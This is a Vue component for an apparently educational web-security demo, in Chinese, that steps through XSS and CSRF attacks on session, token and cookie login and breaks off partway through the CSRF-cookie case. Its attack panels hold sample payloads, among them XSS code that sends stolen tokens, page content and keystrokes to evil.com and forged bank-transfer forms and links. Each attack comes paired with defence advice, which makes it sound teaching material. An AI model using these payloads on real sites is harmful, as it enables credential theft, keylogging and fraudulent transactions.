<template>
  <div style="max-width: 960px; margin: 0 auto;">
    <a-card>
      <template #title>
        <div style="display: flex; align-items: center; gap: 12px;">
          <span>{{ attackConfig.title }}</span>
          <a-tag :color="authConfig.color">{{ authConfig.authLabel }}</a-tag>
        </div>
      </template>

      <a-steps :current="currentStep" style="margin-bottom: 32px;">
        <a-step v-for="(step, index) in steps" :key="index" :title="step.title">
          <template #icon>
            <span style="font-size: 18px;">{{ step.icon }}</span>
          </template>
        </a-step>
      </a-steps>

      <a-row :gutter="24">
        <a-col :span="14">
          <a-card
            size="small"
            :title="steps[currentStep]?.title"
            :style="{ borderColor: attackConfig.color }"
          >
            <p style="color: #666; margin-bottom: 16px;">{{ steps[currentStep]?.desc }}</p>

            <div v-if="currentStep === 0">
              <a-alert :type="attackConfig.alertType" show-icon style="margin-bottom: 16px;">
                <template #message>{{ steps[0]?.alert }}</template>
              </a-alert>
              <a-divider style="margin: 16px 0;">真实案例</a-divider>
              <div style="background: #fafafa; padding: 16px; border-radius: 8px; border-left: 4px solid #ff4d4f;">
                <a-timeline>
                  <a-timeline-item v-for="(event, idx) in steps[0]?.story" :key="idx" :color="event.color">
                    <template #dot>
                      <span style="font-size: 16px;">{{ event.icon }}</span>
                    </template>
                    <p style="font-weight: bold; margin: 0 0 4px 0;">{{ event.time }}</p>
                    <p style="margin: 0; font-size: 13px;">{{ event.content }}</p>
                  </a-timeline-item>
                </a-timeline>
              </div>
              <a-divider style="margin: 16px 0;">攻击信息</a-divider>
              <a-descriptions bordered :column="1" size="small">
                <a-descriptions-item label="攻击类型">{{ attackConfig.attackName }}</a-descriptions-item>
                <a-descriptions-item label="认证方式">{{ authConfig.authLabel }}</a-descriptions-item>
                <a-descriptions-item label="攻击目标">{{ steps[0]?.target }}</a-descriptions-item>
                <a-descriptions-item label="攻击原理">{{ steps[0]?.principle }}</a-descriptions-item>
              </a-descriptions>
            </div>

            <div v-if="currentStep === 1">
              <p style="font-weight: bold; margin-bottom: 8px;">攻击者构造的恶意代码：</p>
              <pre class="code-block" style="color: #ff4d4f; border: 1px solid #ffccc7; background: #fff2f0;">{{ steps[1]?.attackCode }}</pre>
              <a-alert
                :message="steps[1]?.codeExplain"
                type="warning"
                show-icon
                style="margin-top: 12px;"
              />
            </div>

            <div v-if="currentStep === 2">
              <a-alert :type="steps[2]?.resultType === 'danger' ? 'error' : steps[2]?.resultType === 'warning' ? 'warning' : 'success'" show-icon style="margin-bottom: 16px;">
                <template #message>{{ steps[2]?.resultTitle }}</template>
                <template #description>{{ steps[2]?.resultDesc }}</template>
              </a-alert>
              <a-divider style="margin: 12px 0;" />
              <p style="font-weight: bold; margin-bottom: 8px;">攻击者实际获取到的数据：</p>
              <pre class="code-block" style="border: 1px solid #ffccc7; background: #fff2f0;">{{ steps[2]?.stolenData }}</pre>
            </div>

            <div v-if="currentStep === 3">
              <p style="font-weight: bold; margin-bottom: 8px;">防御方案：</p>
              <a-card size="small" :bordered="false" :style="{ background: authConfig.bgColor }">
                <template #title>
                  <span>{{ authConfig.authLabel }} 防御建议</span>
                </template>
                <ul style="padding-left: 16px; font-size: 13px;">
                  <li v-for="d in steps[3]?.defenseList" :key="d">{{ d }}</li>
                </ul>
              </a-card>
              <a-divider style="margin: 12px 0;" />
              <p style="font-weight: bold; margin-bottom: 8px;">防御代码示例：</p>
              <pre class="code-block" style="border: 1px solid #b7eb8f; background: #f6ffed;">{{ steps[3]?.defenseCode }}</pre>
            </div>
          </a-card>
        </a-col>

        <a-col :span="10">
          <a-card size="small" title="攻击流程" :bordered="false" style="background: #fafafa;">
            <div class="flow-diagram">
              <div class="flow-node" :class="{ active: currentStep === 0 }" style="background: #fff2f0; border-color: #ff4d4f;">
                <span class="flow-icon">😈</span>
                <span>攻击者</span>
              </div>
              <div class="flow-arrow" :class="{ active: currentStep === 1 }">
                {{ currentStep === 1 ? '注入恶意代码 ➡️' : '⬇️' }}
              </div>
              <div class="flow-node" :class="{ active: currentStep === 1 }" style="background: #fff7e6; border-color: #fa8c16;">
                <span class="flow-icon">🖥️</span>
                <span>用户浏览器</span>
              </div>
              <div class="flow-arrow" :class="{ active: currentStep === 2 }">
                {{ currentStep === 2 ? steps[2]?.flowLabel : '⬇️' }}
              </div>
              <div class="flow-node" :class="{ active: currentStep === 2 }" style="background: #f6ffed; border-color: #52c41a;">
                <span class="flow-icon">⚙️</span>
                <span>服务端</span>
              </div>
              <div class="flow-arrow" :class="{ active: currentStep === 3 }">
                {{ currentStep === 3 ? '⬆️ 防御' : '⬇️' }}
              </div>
              <div class="flow-node" :class="{ active: currentStep === 3 }" style="background: #e6f7ff; border-color: #1890ff;">
                <span class="flow-icon">🛡️</span>
                <span>安全防护</span>
              </div>
            </div>
          </a-card>

          <a-card size="small" title="操作" :bordered="false" style="background: #fafafa; margin-top: 12px;">
            <div style="text-align: center; padding: 12px 0;">
              <div style="display: flex; flex-direction: column; gap: 12px; align-items: center;">
                <a-button type="primary" @click="nextStep" :danger="currentStep < 3">
                  {{ currentStep === 0 ? '下一步：查看攻击代码' : currentStep === 1 ? '下一步：执行攻击' : currentStep === 2 ? '下一步：查看防御方案' : '完成' }}
                </a-button>
                <a-button type="link" @click="skipDemo" style="color: #999;">
                  跳过演示，直接查看结果
                </a-button>
              </div>
            </div>
          </a-card>
        </a-col>
      </a-row>
    </a-card>
  </div>
</template>

<script setup lang="ts">
import { ref, computed, onMounted } from 'vue'
import { useRouter, useRoute } from 'vue-router'

const router = useRouter()
const route = useRoute()

const attackType = computed(() => (route.query.type as string) || 'xss')
const authType = computed(() => (route.query.auth as string) || 'session')
const currentStep = ref(0)

const attackConfig = computed(() => {
  const configs: Record<string, any> = {
    xss: { title: '🐛 XSS攻击演示', color: '#ff4d4f', alertType: 'error', attackName: 'XSS（跨站脚本攻击）' },
    csrf: { title: '🛡️ CSRF攻击演示', color: '#fa8c16', alertType: 'warning', attackName: 'CSRF（跨站请求伪造）' },
    theft: { title: '🔑 凭证泄露演示', color: '#722ed1', alertType: 'warning', attackName: 'Token/Session凭证泄露' },
  }
  return configs[attackType.value] || configs.xss
})

const authConfig = computed(() => {
  const configs: Record<string, any> = {
    session: { authLabel: '🔐 Session认证', color: '#1890ff', bgColor: '#e6f7ff' },
    token: { authLabel: '🔑 Token(JWT)认证', color: '#52c41a', bgColor: '#f6ffed' },
    cookie: { authLabel: '🍪 Cookie认证', color: '#fa8c16', bgColor: '#fff7e6' },
  }
  return configs[authType.value] || configs.session
})

const accessToken = localStorage.getItem('access_token')
const refreshToken = localStorage.getItem('refresh_token')

const steps = computed(() => {
  const key = `${attackType.value}-${authType.value}`
  const allSteps: Record<string, any[]> = {

    'xss-session': [
      {
        title: '了解攻击', icon: '📖',
        desc: '了解XSS攻击对Session认证的影响',
        alert: '⚠️ 危害：XSS注入的脚本可以在同源环境中读取csrftoken并直接发请求，冒充用户操作',
        target: '窃取csrftoken并冒充用户发请求',
        principle: '攻击者注入恶意JS，读取Cookie中的csrftoken（非HttpOnly），然后直接在用户浏览器中发起请求、窃取数据、监听用户输入',
        story: [
          { time: '周一 10:00', icon: '😈', color: 'red', content: '攻击者黑哥在StudyHub论坛的热门帖子下评论，注入了隐藏的恶意脚本' },
          { time: '周一 14:30', icon: '👤', color: 'blue', content: '大学生小明用Session方式登录StudyHub，浏览了那个帖子，完全没有察觉异常' },
          { time: '周一 14:30', icon: '⚡', color: 'orange', content: '恶意脚本在小明浏览器中执行：读取Cookie中的csrftoken（没有HttpOnly，可以读到），但sessionid有HttpOnly保护，读不到' },
          { time: '周一 14:31', icon: '😈', color: 'red', content: '虽然读不到sessionid，但恶意脚本直接用fetch发起请求，浏览器自动携带sessionid Cookie，攻击者还手动设置了X-CSRFToken请求头' },
          { time: '周二 09:00', icon: '👮', color: 'green', content: '小明发现账号发布了广告帖子。XSS注入的脚本在同源环境中发请求，完全合法，服务端无法区分' },
        ],
      },
      {
        title: '构造攻击', icon: '😈',
        desc: '攻击者注入恶意JavaScript代码，针对Session认证',
        attackCode: `// XSS攻击针对Session认证
<img src=x onerror="
  // 🔴 读取csrftoken（没有HttpOnly，可以读到！）
  const csrfToken = document.cookie
    .split('; ')
    .find(r => r.startsWith('csrftoken='))
    .split('=')[1];
  
  // ✅ sessionid有HttpOnly保护，读不到
  // const sessionId = document.cookie
  //   .split('; ').find(r => r.startsWith('studyhub_sessionid='))
  //   → 读不到！HttpOnly阻止了JS访问
  
  // 🔴 但不需要读取sessionid！
  // 直接发请求，浏览器自动携带sessionid Cookie
  fetch('/api/posts/', {
    method: 'POST',
    credentials: 'include',  // 自动携带sessionid Cookie
    headers: {
      'Content-Type': 'application/json',
      'X-CSRFToken': csrfToken  // 手动设置CSRF Token
    },
    body: JSON.stringify({
      title: '我被XSS攻击了',
      content: 'Session认证也无法阻止XSS'
    })
  });
">`,
        codeExplain: '关键：sessionid有HttpOnly保护无法读取，但csrftoken没有HttpOnly可以被读取。攻击者读取csrftoken放入请求头，浏览器自动携带sessionid Cookie，请求验证通过，攻击成功！',
      },
      {
        title: '攻击结果', icon: '💥',
        desc: 'XSS攻击对Session认证的影响',
        resultType: 'warning',
        resultTitle: '🟡 部分防护 — sessionid无法被窃取，但请求仍可被伪造',
        resultDesc: 'HttpOnly保护了sessionid不被窃取，但攻击者通过XSS读取csrftoken后，可以直接在用户浏览器中发起合法请求。',
        flowLabel: '窃取csrftoken ➡️ 发起请求',
        stolenData: `// XSS攻击Session认证结果：

// ✅ sessionid：无法被JS读取（HttpOnly保护）
//    攻击者无法将sessionid发送到自己的服务器
//    → 凭证不会被远程窃取

// 🔴 csrftoken：可以被JS读取（没有HttpOnly）
//    攻击者可以读取并放入X-CSRFToken请求头
//    → 攻击者在同源环境中合法发请求

// 🔴 直接发请求：浏览器自动携带sessionid Cookie
//    加上手动设置的X-CSRFToken请求头
//    → 服务端验证通过，攻击成功！

// 结论：XSS注入的脚本在同源环境中发请求，完全合法
//       HttpOnly阻止了sessionid被远程窃取`,
      },
      {
        title: '防御方案', icon: '🛡️',
        desc: '了解如何防御XSS攻击对Session认证的影响',
        defenseList: [
          '对用户输入进行HTML转义（最重要）',
          '实施CSP（Content-Security-Policy）策略',
          '设置Cookie的HttpOnly属性（已配置）',
          '使用XSS过滤库',
          '关键操作需二次确认',
        ],
        defenseCode: `// 1. 对用户输入进行HTML转义（防XSS根本措施）
function escapeHtml(text) {
    const div = document.createElement('div');
    div.textContent = text;
    return div.innerHTML;
}

// 2. 实施CSP策略（在HTML meta标签中）
// <meta http-equiv="Content-Security-Policy" 
//   content="script-src 'self'; object-src 'none'">

// 3. Django设置Cookie时启用HttpOnly（已配置）
response.set_cookie(
    key='studyhub_sessionid',
    value=session_key,
    httponly=True,      # 防止JS读取 ✅
    samesite='Lax',     # 防CSRF ✅
)`,
      },
    ],

    'xss-token': [
      {
        title: '了解攻击', icon: '📖',
        desc: '了解XSS攻击对Token认证的影响',
        alert: '⚠️ 危害：XSS可以直接读取localStorage中的Token，完全控制用户账号',
        target: '窃取localStorage中的access_token和refresh_token',
        principle: '攻击者注入恶意JS，直接读取localStorage中的Token，发送到攻击者服务器。之后可在任何地方冒充用户，也可在页面内窃取数据、监听用户输入',
        story: [
          { time: '周一 10:00', icon: '😈', color: 'red', content: '攻击者黑哥在StudyHub论坛的热门帖子下评论，注入了隐藏的恶意脚本' },
          { time: '周一 14:30', icon: '👤', color: 'blue', content: '大学生小明用Token方式登录StudyHub，Token存储在localStorage中，浏览了那个帖子' },
          { time: '周一 14:30', icon: '⚡', color: 'orange', content: '恶意脚本在小明浏览器中执行：直接读取localStorage.getItem("access_token")，获取到完整的JWT Token' },
          { time: '周一 14:31', icon: '😈', color: 'red', content: '黑哥收到小明的Token，在自己的电脑上用这个Token登录StudyHub，冒充小明发帖、查看私信、修改资料' },
          { time: '周二 09:00', icon: '😱', color: 'red', content: '小明发现账号发布了大量广告帖子。Token被窃取后，攻击者可以在任何设备上冒充小明，直到Token过期（60分钟）' },
        ],
      },
      {
        title: '构造攻击', icon: '😈',
        desc: '攻击者注入恶意JavaScript代码，针对Token认证',
        attackCode: `// XSS攻击针对Token认证
<img src=x onerror="
  // 🔴 直接读取localStorage中的Token！
  const accessToken = localStorage.getItem('access_token');
  const refreshToken = localStorage.getItem('refresh_token');
  
  // 🔴 将Token发送到攻击者服务器
  fetch('https://evil.com/steal', {
    method: 'POST',
    body: JSON.stringify({
      access_token: accessToken,    // ✅ 完整的Token！
      refresh_token: refreshToken,  // ✅ 刷新Token！
      url: location.href
    })
  });
">`,
        codeExplain: 'localStorage没有任何访问限制，XSS注入的JS代码可以直接读取所有存储的Token。攻击者获取Token后，可以在自己的设备上冒充用户，无需用户浏览器参与',
      },
      {
        title: '攻击结果', icon: '💥',
        desc: 'XSS攻击对Token认证的影响',
        resultType: 'danger',
        resultTitle: '🔴 高危 — Token被完全窃取，账号被完全控制',
        resultDesc: 'localStorage中的Token可以被JS直接读取并发送到攻击者服务器。攻击者获取Token后可在任何设备上冒充用户，且JWT Token无法主动撤销！',
        flowLabel: '窃取Token ➡️ 远程冒充',
        stolenData: `// XSS攻击Token认证结果：

// 🔴 access_token：被完全窃取！
//    攻击者获取到: "${accessToken ? accessToken.substring(0, 30) + '...' : '(未登录)'}"

// 🔴 refresh_token：被完全窃取！
//    攻击者获取到: "${refreshToken ? refreshToken.substring(0, 30) + '...' : '(未登录)'}"

// 🔴 攻击者可以：
//    1. 在自己的设备上使用Token冒充用户
//    2. 用refresh_token获取新的access_token
//    3. 持续控制账号直到Token过期

// ❌ 无法主动撤销JWT Token！
//    只能等待自然过期（access_token: 60分钟）

// 结论：Token认证对XSS攻击最脆弱
//       localStorage中的Token完全暴露给JS`,
      },
      {
        title: '防御方案', icon: '🛡️',
        desc: '了解如何防御XSS攻击对Token认证的影响',
        defenseList: [
          '严格防止XSS漏洞（最重要）',
          '实施CSP（Content-Security-Policy）策略',
          '考虑改用HttpOnly Cookie存储Token',
          '缩短Token有效期（15分钟）',
          '实现Token黑名单机制',
        ],
        defenseCode: `// 1. 对用户输入进行HTML转义（防XSS根本措施）
function escapeHtml(text) {
    const div = document.createElement('div');
    div.textContent = text;
    return div.innerHTML;
}

// 2. 缩短Token有效期
// settings.py:
SIMPLE_JWT = {
    'ACCESS_TOKEN_LIFETIME': timedelta(minutes=15),
}

// 3. 实现Token黑名单
from rest_framework_simplejwt.token_blacklist.models import BlacklistedToken
def revoke_token(token):
    BlacklistedToken.objects.create(token=token)

// 4. 考虑改用HttpOnly Cookie存储Token
// 这样JS就无法读取Token，XSS也无法窃取`,
      },
    ],

    'xss-cookie': [
      {
        title: '了解攻击', icon: '📖',
        desc: '了解XSS攻击对Cookie认证的影响',
        alert: '⚠️ 危害：XSS无法窃取HttpOnly的Cookie Token，但仍可在页面内冒充用户发请求、窃取页面内容、监听用户输入',
        target: '尝试窃取Cookie中的Token并冒充用户',
        principle: '攻击者注入恶意JS，但Cookie中的access_token设置了HttpOnly，JS无法读取。攻击者无法将Token发送到远程服务器，但仍可在页面内发请求、窃取数据',
        story: [
          { time: '周一 10:00', icon: '😈', color: 'red', content: '攻击者黑哥在StudyHub论坛的热门帖子下评论，注入了隐藏的恶意脚本' },
          { time: '周一 14:30', icon: '👤', color: 'blue', content: '大学生小明用Cookie方式登录StudyHub，Token存储在HttpOnly Cookie中，浏览了那个帖子' },
          { time: '周一 14:30', icon: '⚡', color: 'orange', content: '恶意脚本尝试读取Cookie中的access_token，但HttpOnly阻止了JS访问！攻击者无法将Token发送到自己的服务器' },
          { time: '周一 14:31', icon: '⚠️', color: 'orange', content: '但攻击者仍可直接在页面内发请求（浏览器自动携带Cookie），窃取页面内容，监听小明的键盘输入。只是无法远程使用Token' },
          { time: '周二 09:00', icon: '🟡', color: 'orange', content: '小明发现账号发布了一些奇怪的内容。HttpOnly阻止了Token被远程窃取，但XSS仍能在页面内执行恶意操作' },
        ],
      },
      {
        title: '构造攻击', icon: '😈',
        desc: '攻击者注入恶意JavaScript代码，针对Cookie认证',
        attackCode: `// XSS攻击针对Cookie认证
<img src=x onerror="
  // ❌ 尝试读取Cookie中的Token → 失败！
  const cookies = document.cookie;
  // cookies中不包含access_token和refresh_token
  // 因为它们设置了HttpOnly=True
  
  // ❌ 无法将Token发送到攻击者服务器
  // 因为根本读不到Token的值
  
  // 🔴 但仍可在页面内直接发请求！
  // 浏览器会自动携带Cookie（含access_token）
  fetch('/api/posts/', {
    method: 'POST',
    credentials: 'include',  // 自动携带Cookie
    body: JSON.stringify({
      title: 'XSS注入的帖子',
      content: '虽然无法窃取Token，但仍可冒充用户操作'
    })
  });
  
  // 🔴 还可以窃取页面内容
  const pageContent = document.body.innerHTML;
  fetch('https://evil.com/steal', {
    method: 'POST',
    body: pageContent  // 页面内容可以被发送！
  });
  
  // 🔴 监听用户键盘输入
  document.addEventListener('keydown', (e) => {
    fetch('https://evil.com/keylog?key=' + e.key);
  });
">`,
        codeExplain: 'HttpOnly只阻止JS读取Token，但不阻止XSS执行其他恶意操作。攻击者仍可在页面内发请求（浏览器自动携带Cookie）、窃取页面内容、监听用户输入',
      },
      {
        title: '攻击结果', icon: '💥',
        desc: 'XSS攻击对Cookie认证的影响',
        resultType: 'warning',
        resultTitle: '🟡 部分防护 — Token无法被窃取，但页面内仍可执行恶意操作',
        resultDesc: 'HttpOnly保护了Cookie中的Token不被JS读取，攻击者无法将Token发送到远程服务器。但XSS注入的脚本仍可在页面内发请求、窃取数据、监听用户输入',
        flowLabel: '❌ 无法窃取Token，⚠️ 但可页面内攻击',
        stolenData: `// XSS攻击Cookie认证结果：

// ✅ access_token：无法被JS读取（HttpOnly保护）
//    攻击者无法获取Token的值
//    → 无法发送到远程服务器

// ✅ refresh_token：无法被JS读取（HttpOnly保护）
//    攻击者无法获取刷新Token
//    → 无法远程续期

// 🔴 页面内请求：浏览器自动携带Cookie
//    攻击者可以在当前页面内发请求
//    可以窃取页面内容、监听键盘输入
//    可以冒充用户执行任何操作

// ✅ 远程冒充：不可能！
//    攻击者没有Token的值
//    → 无法在自己的设备上使用

// 结论：HttpOnly只防止Token被窃取
//       XSS仍能在页面内执行恶意操作
//       防XSS才是根本解决方案`,
      },
      {
        title: '防御方案', icon: '🛡️',
        desc: '了解如何防御XSS攻击对Cookie认证的影响',
        defenseList: [
          '防止XSS漏洞才是根本解决方案',
          'HttpOnly防止Token被窃取（已配置）',
          'SameSite防止跨站发送Cookie（已配置）',
          '对用户输入进行HTML转义',
          '实施CSP（Content-Security-Policy）策略',
          '关键操作需二次确认',
        ],
        defenseCode: `// 1. 设置Cookie时启用HttpOnly（已配置）
response.set_cookie(
    key='access_token',
    value=token,
    httponly=True,      # 防止JS读取 ✅
    secure=True,        # 仅HTTPS传输 ✅
    samesite='Lax',     # 防CSRF ✅
)

// 2. 对用户输入进行HTML转义（防XSS根本措施）
function escapeHtml(text) {
    const div = document.createElement('div');
    div.textContent = text;
    return div.innerHTML;
}

// 3. 关键操作需二次确认（防止页面内伪造）
// 例如：转账、修改密码等操作需要输入验证码`,
      },
    ],

    'csrf-session': [
      {
        title: '了解攻击', icon: '📖',
        desc: '了解CSRF攻击对Session认证的影响',
        alert: '⚠️ 危害：伪造转账/交易请求、篡改账号信息、发布非法内容。但SameSite=Lax可阻止跨站POST请求',
        target: '冒充用户发送POST请求',
        principle: '攻击者诱导用户访问恶意网站，浏览器自动携带sessionid Cookie。但SameSite=Lax阻止跨站POST携带Cookie，且攻击者无法获取csrftoken放入请求头',
        story: [
          { time: '周五 09:00', icon: '👤', color: 'blue', content: '财务人员小张用Session方式登录网上银行，浏览器保存了sessionid和csrftoken的Cookie，然后打开邮箱' },
          { time: '周五 09:15', icon: '📧', color: 'orange', content: '小张收到邮件「紧急！查看本月工资调整通知」，点击链接打开了恶意网站evil.com' },
          { time: '周五 09:15', icon: '😈', color: 'red', content: '恶意网站尝试自动提交POST表单到银行，但SameSite=Lax阻止了跨站POST请求携带sessionid Cookie！' },
          { time: '周五 09:16', icon: '🛡️', color: 'green', content: '即使Cookie被携带，攻击者也读不到csrftoken（同源策略），无法设置X-CSRFToken请求头，CSRF验证也会失败！' },
          { time: '周五 09:20', icon: '✅', color: 'green', content: '双重防护生效：SameSite=Lax阻止Cookie发送 + CSRF Token验证阻止伪造请求。攻击完全失败！' },
        ],
      },
      {
        title: '构造攻击', icon: '😈',
        desc: '攻击者在恶意网站上构造伪造请求，针对Session认证',
        attackCode: `<!-- 攻击者网站 evil.com 上的恶意页面 -->
<h1>恭喜你中奖了！点击领取</h1>

<!-- 尝试1：隐藏表单自动提交POST -->
<form id="csrf-form" action="https://bank.com/api/transfer" method="POST">
  <input type="hidden" name="to" value="hacker" />
  <input type="hidden" name="amount" value="10000" />
</form>
<script>
  document.getElementById('csrf-form').submit();
  // ❌ SameSite=Lax阻止跨站POST携带Cookie
  // → 请求中没有sessionid → 401 未认证
<\/script>

<!-- 尝试2：用fetch发起POST请求 -->
<script>
  fetch('https://bank.com/api/transfer', {
    method: 'POST',
    credentials: 'include',
    body: JSON.stringify({ to: 'hacker', amount: 10000 })
  });
  // ❌ SameSite=Lax阻止Cookie发送
  // ❌ 即使Cookie被发送，也读不到csrftoken
  //    → 无法设置X-CSRFToken请求头 → 403
<\/script>

<!-- 🔴 尝试3：GET请求攻击（SameSite=Lax允许！） -->
<!-- 方式A：诱导用户点击链接 -->
<a href="https://bank.com/api/transfer?to=hacker&amount=10000">
  点击领取大奖
</a>
<!-- ⚠️ 用户点击后，浏览器会携带Cookie发送GET请求！
     SameSite=Lax允许顶级导航的GET请求携带Cookie -->

<!-- 方式B：自动跳转 -->
<script>
  // 用户打开页面后自动跳转
  window.location = 'https://bank.com/api/transfer?to=hacker&amount=10000';
  // ⚠️ 顶级导航的GET请求，浏览器会携带Cookie！
  // 如果服务端用GET执行写操作，攻击成功！
<\/script>`,
        codeExplain: 'POST请求被SameSite=Lax阻止，但GET请求可以携带Cookie！SameSite=Lax的规则：顶级导航的GET请求（如点击链接、window.location跳转）允许携带Cookie。如果服务端有GET接口执行写操作（如转账、删除），攻击者可以诱导用户点击链接发起攻击',
      },
      {
        title: '攻击结果', icon: '💥',
        desc: 'CSRF攻击对Session认证的影响',
        resultType: 'warning',
        resultTitle: '🟡 部分防护 — SameSite=Lax阻止POST，但GET请求仍可能携带Cookie',
        resultDesc: 'SameSite=Lax阻止了跨站POST请求携带Cookie，CSRF Token也提供了额外保护。但顶级导航的GET请求（如点击链接、window.location跳转）仍会携带Cookie，如果服务端有GET接口执行写操作则存在风险',
        flowLabel: '❌ Cookie被阻止',
        stolenData: `// CSRF攻击Session认证结果：

// 🟡 POST请求：SameSite=Lax阻止Cookie发送
//    请求中没有sessionid → 401 未认证 ✅
//    即使绕过SameSite，也没有X-CSRFToken → 403 ✅
//    → 双重防护，POST请求攻击失败

// 🔴 GET请求：SameSite=Lax允许携带Cookie！
//    SameSite=Lax规则：
//    - POST请求 → 不携带Cookie ✅
//    - 顶级导航GET请求（点击链接、跳转）→ 携带Cookie ⚠️
//    - 子资源GET请求（img、script）→ 不携带Cookie ✅
//
//    攻击方式：
//    <a href="https://bank.com/api/transfer?to=hacker">点击领取</a>
//    window.location = 'https://bank.com/api/transfer?to=hacker'
//
//    用户点击后 → 浏览器携带Cookie发送GET请求
//    → 如果服务端用GET执行写操作，攻击成功！
//    → Django的CSRF中间件不检查GET请求

// 结论：Session认证对CSRF有较好防护
//       POST请求：SameSite + CSRF Token双重保护 ✅
//       GET请求：仅SameSite保护，需避免GET执行写操作`,
      },
      {
        title: '防御方案', icon: '🛡️',
        desc: '了解如何防御CSRF攻击对Session认证的影响',
        defenseList: [
          'SameSite=Lax已配置（防护跨站POST请求）',
          'CSRF Token双重验证（仅对POST等写请求有效）',
          '⚠️ GET请求防御：永远不要用GET执行写操作！',
          '敏感操作需二次确认（如输入密码/验证码）',
          '验证Referer/Origin请求头',
          '使用SameSite=Strict（更严格，但影响体验）',
        ],
        defenseCode: `# 1. SameSite=Lax 已配置（当前项目）
response.set_cookie(
    key='studyhub_sessionid',
    value=session_key,
    samesite='Lax',  # POST跨站请求阻止
)

# 2. CSRF Token 双重验证（Django默认启用）
# ⚠️ 注意：CSRF中间件只检查POST/PUT/DELETE，不检查GET！
from django.views.decorators.csrf import csrf_protect

@csrf_protect
def transfer(request):
    if request.method == 'POST':
        # CSRF Token会自动验证
        pass

# 3. ⚠️ GET请求防御：永远不要用GET执行写操作！
# ❌ 错误做法：
def transfer_get(request):
    to = request.GET.get('to')
    amount = request.GET.get('amount')
    # 执行转账... 这很危险！CSRF Token防不住！

# ✅ 正确做法：GET只用于获取数据
def transfer(request):
    if request.method == 'GET':
        # 只显示转账表单，不执行转账
        return render(request, 'transfer_form.html')
    elif request.method == 'POST':
        # 执行转账，CSRF Token会验证
        do_transfer(...)

# 4. 敏感操作二次确认
def transfer(request):
    if request.method == 'POST':
        # 要求用户输入密码或验证码
        if not verify_password(request.user, request.POST.get('password')):
            return HttpResponse('密码错误')
        do_transfer(...)

# 5. SameSite=Strict（最严格，阻止所有跨站请求）
response.set_cookie(
    key='studyhub_sessionid',
    samesite='Strict',  # 连点击链接都不会带Cookie
)`,
      },
    ],

    'csrf-token': [
      {
        title: '了解攻击', icon: '📖',
        desc: '了解CSRF攻击对Token认证的影响',
        alert: '⚠️ Token认证天然免疫CSRF攻击，因为Authorization头不会被浏览器自动携带',
        target: '尝试冒充用户发送请求',
        principle: 'CSRF依赖浏览器自动携带Cookie，但Token认证通过Authorization头发送，浏览器不会自动携带，攻击者也无法获取Token',
        story: [
          { time: '周五 09:00', icon: '👤', color: 'blue', content: '财务人员小张用Token方式登录网上银行，Token存储在localStorage中，然后打开邮箱' },
          { time: '周五 09:15', icon: '📧', color: 'orange', content: '小张收到邮件「紧急！查看本月工资调整通知」，点击链接打开了恶意网站evil.com' },
          { time: '周五 09:15', icon: '😈', color: 'red', content: '恶意网站尝试发请求到银行，但Token在localStorage中，浏览器不会自动携带Authorization头！' },
          { time: '周五 09:16', icon: '🛡️', color: 'green', content: '攻击者也无法读取localStorage（同源策略），根本获取不到Token。请求中没有Authorization头 → 401 未认证' },
          { time: '周五 09:20', icon: '✅', color: 'green', content: 'Token认证天然免疫CSRF！无论攻击者怎么构造请求，都无法让浏览器自动携带Authorization头' },
        ],
      },
      {
        title: '构造攻击', icon: '😈',
        desc: '攻击者尝试构造伪造请求，针对Token认证',
        attackCode: `<!-- 攻击者网站 evil.com 上的恶意页面 -->
<h1>恭喜你中奖了！点击领取</h1>

<script>
  // 尝试1：直接发请求
  fetch('https://bank.com/api/transfer', {
    method: 'POST',
    credentials: 'include',
    body: JSON.stringify({ to: 'hacker', amount: 10000 })
  });
  // ❌ 没有Authorization头 → 401 未认证
  
  // 尝试2：读取localStorage中的Token
  const token = localStorage.getItem('access_token');
  // ❌ 同源策略阻止！evil.com无法读取bank.com的localStorage
  
  // 尝试3：用表单提交
  // <form action="https://bank.com/api/transfer">
  // ❌ 表单无法设置Authorization头
  // ❌ 请求中没有Token → 401 未认证
<\/script>

// 结论：Token认证完全免疫CSRF攻击！`,
        codeExplain: 'Token认证通过Authorization头发送，浏览器不会自动携带。攻击者无法读取localStorage（同源策略），也无法通过表单设置Authorization头。CSRF攻击完全无效',
      },
      {
        title: '攻击结果', icon: '💥',
        desc: 'CSRF攻击对Token认证的影响',
        resultType: 'success',
        resultTitle: '🟢 完全安全 — Token认证天然免疫CSRF攻击',
        resultDesc: 'Authorization头不会被浏览器自动携带，攻击者也无法读取localStorage中的Token。无论POST还是GET请求，CSRF攻击都无法成功',
        flowLabel: '❌ 无法携带Token',
        stolenData: `// CSRF攻击Token认证结果：

// ✅ POST请求：没有Authorization头 → 401
// ✅ GET请求：没有Authorization头 → 401
// ✅ 表单提交：无法设置Authorization头 → 401

// ✅ localStorage：同源策略阻止跨域读取
//    evil.com无法读取bank.com的localStorage
//    → 攻击者获取不到Token

// 结论：Token认证对CSRF攻击完全免疫
//       因为Authorization头不会被浏览器自动携带
//       这是Token认证相比Cookie认证的最大安全优势`,
      },
      {
        title: '防御方案', icon: '🛡️',
        desc: 'Token认证天然免疫CSRF，但仍需注意其他安全',
        defenseList: [
          'Token认证天然免疫CSRF（无需额外防护）',
          'Authorization头不会被浏览器自动携带',
          'localStorage受同源策略保护',
          '但仍需防止XSS攻击（可窃取Token）',
          '使用HTTPS防止中间人攻击',
        ],
        defenseCode: `// Token认证天然免疫CSRF，无需额外防护
// 原因：浏览器不会自动携带Authorization头

// 但仍需注意：
// 1. 防止XSS攻击（可窃取localStorage中的Token）
// 2. 使用HTTPS（防止中间人窃取Token）
// 3. 缩短Token有效期（减少泄露风险）

// Token认证的CSRF防护是"免费的"
// 这也是为什么API开发推荐使用Token认证`,
      },
    ],

    'csrf-cookie': [
      {
        title: '了解攻击', icon: '📖',
        desc: '了解CSRF攻击对Cookie认证的影响',
        alert: '⚠️ 危害：Cookie认证与Session认证的CSRF风险一致，浏览器会自动携带Cookie',
        target: '冒充用户发送请求',
        principle: 'Cookie认证的access_token在Cookie中，浏览器会自动携带。但SameSite=Lax阻止跨站POST携带Cookie，且Cookie认证不需要CSRF Token验证',
        story: [
          { time: '周五 09:00', icon: '👤', color: 'blue', content: '财务人员小张用Cookie方式登录网上银行，浏览器保存了含access_token的Cookie，然后打开邮箱' },
          { time: '周五 09:15', icon: '📧', color: 'orange', content: '小张收到邮件「紧急！查看本月工资调整通知」，点击链接打开了恶意网站evil.com' },
          { time: '周五 09:15', icon: '😈', color: 'red', content: '恶意网站尝试自动提交POST表单到银行，SameSite=Lax阻止了跨站POST请求携带Cookie！' },
